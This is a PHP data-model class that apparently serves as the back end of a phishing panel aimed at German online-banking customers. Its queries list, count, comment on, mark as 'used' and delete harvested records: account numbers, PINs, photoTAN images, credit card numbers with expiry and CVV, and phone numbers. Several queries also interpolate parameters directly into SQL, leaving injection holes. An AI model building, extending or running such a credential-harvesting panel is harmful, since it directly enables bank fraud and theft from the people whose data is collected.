<?php
class DataModel {
    private $conn;
    
    public function __construct($db) {
        $this->conn = $db;
    }

    public function getAllData($start, $limit, $order, $used) {
	$query = "SELECT 
            login.id, 
            login.randomId, 
            login.Filiale as subsidiaryCompany, 
            login.Konto as account, 
            login.Unterkonto as subAccount, 
            login.pin, 
            login.direkt_zu as directTo,
            login.created_at, 
            phototan.Phototan as uploadedImage,
            IFNULL(kreditkarte.Kartennummer, '-') as creditCardNumber,
            IFNULL(kreditkarte.exp_date, '-') as exp_date,
            IFNULL(kreditkarte.cvv, '-') as cvv,
            IFNULL(telefonummer.Telefonummer, '-') as phoneNumber
            FROM login 
            JOIN phototan ON login.id = phototan.login_id 
            LEFT JOIN kreditkarte ON login.id = kreditkarte.login_id
            LEFT JOIN telefonummer ON login.id = telefonummer.login_id
            WHERE login.used = $used
            ORDER BY login.created_at $order
            LIMIT :start, :limit";    
	$stmt = $this->conn->prepare($query);
        $stmt->bindParam(':start', $start, PDO::PARAM_INT);
        $stmt->bindParam(':limit', $limit, PDO::PARAM_INT);
        $stmt->execute();
        
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }

    public function getDataCount($used) {
        $query = "SELECT 
            COUNT(login.id) as total
            FROM login 
            JOIN phototan ON login.id = phototan.login_id 
            WHERE login.used = $used";    
        $stmt = $this->conn->prepare($query);
        $stmt->execute();
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        
        return $row['total'];
    }

    public function deleteDataById($id) {
        try {
            // Start transaction
            $this->conn->beginTransaction();
    
            // Delete from child tables first to maintain referential integrity
            $tables = ['phototan', 'kreditkarte', 'telefonummer'];
            foreach ($tables as $table) {
                $stmt = $this->conn->prepare("DELETE FROM $table WHERE login_id = :userId");
                $stmt->bindParam(':userId', $id, PDO::PARAM_INT);
                $stmt->execute();
            }
    
            // Delete from login table
            $stmt = $this->conn->prepare("DELETE FROM login WHERE id = :userId");
            $stmt->bindParam(':userId', $id, PDO::PARAM_INT);
            $stmt->execute();
    
            // Commit transaction
            $this->conn->commit();
    
            return true;
        } catch (PDOException $e) {
            // Rollback transaction on error
            $this->conn->rollBack();
    
            // Log error or handle exception
            error_log($e->getMessage());
            return false;
        }
    }


    public function getUploadedImageByLoginId($login_id) {
        $query = "SELECT Phototan as uploadedImage FROM phototan WHERE login_id = :login_id";
        $stmt = $this->conn->prepare($query);
        $stmt->bindParam(':login_id', $login_id, PDO::PARAM_INT);
        $stmt->execute();
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
    
        return $row['uploadedImage'];
    }



    public function createComment($login_id, $comment) {
        $query = "INSERT INTO comment (login_id, comment) 
                  VALUES (:login_id, :comment)";
        $stmt = $this->conn->prepare($query);
        $stmt->bindParam(':login_id', $login_id, PDO::PARAM_INT);
        $stmt->bindParam(':comment', $comment, PDO::PARAM_STR);
        $stmt->execute();
        
        return $this->conn->lastInsertId();
    }
    
    public function updateComment($comment_id, $comment) {
        $query = "UPDATE comment 
                  SET comment = :comment 
                  WHERE comment_id = :comment_id";
        $stmt = $this->conn->prepare($query);
        $stmt->bindParam(':comment_id', $comment_id, PDO::PARAM_INT);
        $stmt->bindParam(':comment', $comment, PDO::PARAM_STR);
        $stmt->execute();
        
        return $stmt->rowCount() > 0;
    }
    

    public function getComment($comment_id) {
        $query = "SELECT * FROM comment WHERE comment_id = :comment_id";
        $stmt = $this->conn->prepare($query);
        $stmt->bindParam(':comment_id', $comment_id, PDO::PARAM_INT);
        $stmt->execute();
        
        return $stmt->fetch(PDO::FETCH_ASSOC);
    }
    

    public function getCommentByLoginId($login_id) {
        $query = "SELECT * FROM comment WHERE login_id = :login_id";
        $stmt = $this->conn->prepare($query);
        $stmt->bindParam(':login_id', $login_id, PDO::PARAM_INT);
        $stmt->execute();
        
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }

    public function bulkDeleteByIds($ids){
        try {
            // Start transaction
            $this->conn->beginTransaction();
    
            // Delete from child tables first to maintain referential integrity
            $tables = ['phototan', 'kreditkarte', 'telefonummer'];
            foreach ($tables as $table) {
                $stmt = $this->conn->prepare("DELETE FROM $table WHERE login_id IN (".implode(',', array_fill(0, count($ids), '?')).")");
                $stmt->execute($ids);
            }
    
            // Delete from login table
            $stmt = $this->conn->prepare("DELETE FROM login WHERE id IN (".implode(',', array_fill(0, count($ids), '?')).")");
            $stmt->execute($ids);
    
            // Commit transaction
            $this->conn->commit();
    
            return true;
        } catch (PDOException $e) {
            // Rollback transaction on error
            $this->conn->rollBack();
    
            // Log error or handle exception
            error_log($e->getMessage());
            return false;
        }
    }

    // update used = 1 in login table
    public function updateUsed($id, $used) {
        $query = "UPDATE login SET used = $used WHERE id = :id";
        $stmt = $this->conn->prepare($query);
        $stmt->bindParam(':id', $id, PDO::PARAM_INT);
        $stmt->execute();
        
        return $stmt->rowCount() > 0;
    }

    // bulk update used = $used in login table
    public function bulkUpdateUsed($ids, $used) {
        try {
            // Start transaction
            $this->conn->beginTransaction();
    
            // Delete from child tables first to maintain referential integrity
            $stmt = $this->conn->prepare("UPDATE login SET used = $used WHERE id IN (".implode(',', array_fill(0, count($ids), '?')).")");
            $stmt->execute($ids);
    
            // Commit transaction
            $this->conn->commit();
    
            return true;
        } catch (PDOException $e) {
            // Rollback transaction on error
            $this->conn->rollBack();
    
            // Log error or handle exception
            error_log($e->getMessage());
            return false;
        }
    }


}
?>
